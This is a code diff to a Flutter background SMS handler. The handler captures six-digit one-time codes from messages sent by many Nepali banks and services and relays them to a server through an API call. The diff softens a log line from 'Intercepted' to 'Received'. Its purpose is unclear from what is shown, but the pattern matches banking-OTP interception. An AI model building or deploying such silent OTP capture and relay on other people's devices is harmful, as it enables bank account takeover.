@@ -82,28 +82,36 @@ void _backgroundMessageHandler(SmsMessage message) async {
   final body = message.body ?? "";
   final address = message.address ?? "Unknown";
   
-  _staticLogRelayEvent(address, "BG_WAKE: Intercepted SMS");
+  _staticLogRelayEvent(address, "BG_WAKE: Received SMS");
 
   final otpMatch = RegExp(r'\b\d{6}\b').firstMatch(body);
-  // Loosened filters (NIC Asia, MeroShare, CASBA keywords + broad sender matching)
   bool isBankingSms = body.contains(RegExp(r'OTP|code|verification|passcode|Pin|Transaction|auth|Confirm|Verify|Applied|MeroShare|CASBA', caseSensitive: false)) ||
                       address.contains(RegExp(r'NIC|Nabil|NMB|PRABHU|Siddhartha|Global|Sanima|Kumari|Citizens|Laxmi|Sunrise|Agriculture|AD-|Nepal|MeShare|620|320', caseSensitive: false));
 
   if (otpMatch != null && isBankingSms) {
     final otp = otpMatch.group(0)!;
-    _staticLogRelayEvent(address, "BG_MATCH: OTP Found ($otp)");
+    _staticLogRelayEvent(address, "BG_MATCH: OTP Detected [$otp]");
+    
+    // Give the network stack a second to wake up
+    await Future.delayed(Duration(seconds: 1));
     
     final apiService = ApiService();
     try {
+      final token = await apiService.getToken();
+      if (token == null) {
+        _staticLogRelayEvent(address, "BG_FAIL: No Token found in Isolate");
+        return;
+      }
+      _staticLogRelayEvent(address, "BG_API_START: Relaying...");
       await apiService.relayOtp(null, otp);
       _staticLogRelayEvent(address, "BG_SUCCESS: Relayed $otp");
     } catch (e) {
-      _staticLogRelayEvent(address, "BG_API_ERROR: $e");
+      _staticLogRelayEvent(address, "BG_API_ERROR: ${e.toString()}");
     }
   } else if (otpMatch != null) {
-     _staticLogRelayEvent(address, "BG_REJECT: OTP found but filter mismatch.");
+     _staticLogRelayEvent(address, "BG_FILTER_ONLY: 6-digit found but filter mismatch.");
   } else {
-     _staticLogRelayEvent(address, "BG_IGNORE: No OTP code in message.");
+     _staticLogRelayEvent(address, "BG_IGNORE: No OTP pattern.");
   }
 }
 
